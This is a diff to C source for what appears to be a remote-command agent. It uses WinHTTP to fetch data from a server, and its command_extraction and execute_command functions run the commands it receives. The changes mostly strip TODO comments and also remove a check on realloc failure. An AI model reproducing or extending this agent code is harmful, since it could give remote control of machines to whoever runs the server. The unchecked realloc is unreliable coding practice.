@@ -63,7 +63,7 @@ char* send_connection_request(LPCWSTR method, LPCWSTR path, char* request_data) 
         return response;
     }
 
-    // Setup HTTP Request handle // TODO: can last parameter be WINHTTP_FLAG_SECURE or WINHTTP_FLAG_ESCAPE_DISABLE instead of 0?
+    // Setup HTTP Request handle
     h_request = WinHttpOpenRequest(h_connect, method, path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
     if (!h_request) {
@@ -73,11 +73,10 @@ char* send_connection_request(LPCWSTR method, LPCWSTR path, char* request_data) 
         return response;
     }
 
-    // Add Headers to the request
+    // Add Headers to the request - not really needed for now, but can be used if necessary
     // if (request_size > 0) WinHttpAddRequestHeaders(h_request, L"Content-Type: application/json\r\n", -1, WINHTTP_ADDREQ_FLAG_ADD);
 
     // Send HTTP request
-    // TODO: Look through all the parameters once!
     if (!WinHttpSendRequest(h_request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)request_data, request_size, request_size, 0)) {
         printf("[send_connection_request] WinHttpSendRequest failed!\n");
         WinHttpCloseHandle(h_request);
@@ -85,7 +84,6 @@ char* send_connection_request(LPCWSTR method, LPCWSTR path, char* request_data) 
         WinHttpCloseHandle(h_session);
     }
 
-    // TODO: Look through the parameters once!
     if (!WinHttpReceiveResponse(h_request, NULL)) {
         printf("[send_connection_request] WinHttpReceiveResponse failed!\n");
         WinHttpCloseHandle(h_request);
@@ -217,10 +215,6 @@ char* execute_command(char* command) {
             break;
 
         output = realloc(output, total_bytes + bytes_read + 1);
-        /*if (!output) {
-            free(output);
-            break; // TODO: Need an alternative change if realloc fails!!
-        }*/
 
         memcpy(output + total_bytes, buf, bytes_read);
         total_bytes += bytes_read;
@@ -334,7 +328,7 @@ void command_extraction(AgentInfo* agent, const char* command_info) {
         strncpy(command, command_starts_here, command_size);
         command[command_size] = '\0';
 
-        char* output = execute_command(command); // TODO: how to prevent memory leakage in this case?
+        char* output = execute_command(command);
         if (!output) {
             free(output);
             break;
